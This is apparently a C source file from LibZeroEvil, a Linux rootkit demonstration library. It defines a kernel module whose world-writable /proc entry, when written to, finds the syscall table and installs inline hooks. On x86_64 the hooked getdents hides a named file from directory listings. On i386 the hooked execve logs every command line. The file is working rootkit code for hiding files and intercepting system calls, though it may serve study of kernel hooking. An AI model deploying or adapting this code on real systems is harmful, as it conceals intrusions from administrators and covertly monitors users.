// Copyright 2016 Gu Zhengxiong <rectigu@gmail.com>
//
// This file is part of LibZeroEvil.
//
// LibZeroEvil is free software:
// you can redistribute it and/or modify it
// under the terms of the GNU General Public License
// as published by the Free Software Foundation,
// either version 3 of the License,
// or (at your option) any later version.
//
// LibZeroEvil is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with LibZeroEvil.
// If not, see <http://www.gnu.org/licenses/>.


# ifndef CPP
# include <linux/module.h>
# include <linux/kernel.h>
# include <linux/syscalls.h>
// proc_create, proc_remove.
# include <linux/proc_fs.h>
// kmalloc, kfree.
# include <linux/slab.h>
# endif // CPP

# include "zeroevil/zeroevil.h"


MODULE_LICENSE("GPL");

# define SECRET_FILE "032416_525.mp4"

unsigned long **sct;

# define NAME "entry"

struct proc_dir_entry *entry;

ssize_t
write_handler(struct file * filp, const char __user *buff,
              size_t count, loff_t *offp);

struct file_operations proc_fops = {
    .write = write_handler
};

# if defined(__x86_64__)
asmlinkage long
(*real_getdents)(unsigned int fd,
                 struct linux_dirent __user *dirent,
                 unsigned int count);
asmlinkage long
fake_getdents(unsigned int fd,
              struct linux_dirent __user *dirent,
              unsigned int count);
# elif defined(__i386__)
asmlinkage long
fake_execve(const char __user *filename,
            const char __user *const __user *argv,
            const char __user *const __user *envp);
asmlinkage long
(*real_execve)(const char __user *filename,
               const char __user *const __user *argv,
               const char __user *const __user *envp);
# else
# error "Unsupported Architecture!"
# endif

int
init_module(void)
{
    fm_alert("%s\n", "Greetings the World!");

    entry = proc_create(NAME, S_IRUGO | S_IWUGO, NULL, &proc_fops);

    return 0;
}


void
cleanup_module(void)
{
    fm_alert("%s\n", "Farewell the World!");

    proc_remove(entry);
# if defined(__x86_64__)
    remove_inline_hook(real_getdents);
# elif defined(__i386__)
    remove_inline_hook(real_execve);
# else
# error "Unsupported Architecture!"
# endif

    return;
}


// INFO: This is for debugging using gdb via kgdb,
// and with this we can break upon interesting code conveniently.
ssize_t
write_handler(struct file * filp, const char __user *buff,
              size_t count, loff_t *offp)
{
    sct = get_sct();
    if (sct == NULL) {
        fm_alert("%s\n", "get_sct failed.");
        return count;
    }
    fm_alert("sys_call_table: %p\n", sct);

# if defined (__x86_64__)
    real_getdents = (void *)sct[__NR_getdents];
    fm_alert("real_getdents: %p\n", real_getdents);
    install_inline_hook(real_getdents, fake_getdents);
# elif defined(__i386__)
    real_execve = (void *)sct[__NR_execve];
    fm_alert("real_execve: %p\n", real_execve);
    install_inline_hook(real_execve, fake_execve);
# else
# error "Unsupported Architecture!"
# endif
    return count;
}


# if defined(__x86_64__)
asmlinkage long
fake_getdents(unsigned int fd,
              struct linux_dirent __user *dirent,
              unsigned int count)
{
    long ret;

    pause_inline_hook(real_getdents);
    ret = real_getdents(fd, dirent, count);
    resume_inline_hook(real_getdents);

    print_dents(dirent, ret);
    ret = remove_dent(SECRET_FILE, dirent, ret);
    print_dents(dirent, ret);

    return ret;
}
# elif defined(__i386__)
asmlinkage long
fake_execve(const char __user *filename,
            const char __user *const __user *argv,
            const char __user *const __user *envp)
{
    long ret;
    char *args;
    char *buff;

    buff = kmalloc(PAGE_SIZE, GFP_KERNEL);
    if (buff != NULL) {
        args = join_strings(argv, " ", buff, PAGE_SIZE);
    } else {
        args = (char *)argv[0];
        buff = NULL;
    }
    fm_alert("%s\n", args);
    kfree(buff);

    pause_inline_hook(real_execve);
    ret = real_execve(filename, argv, envp);
    resume_inline_hook(real_execve);

    return ret;
}
# else
# error "Unsupported Architeture!"
# endif
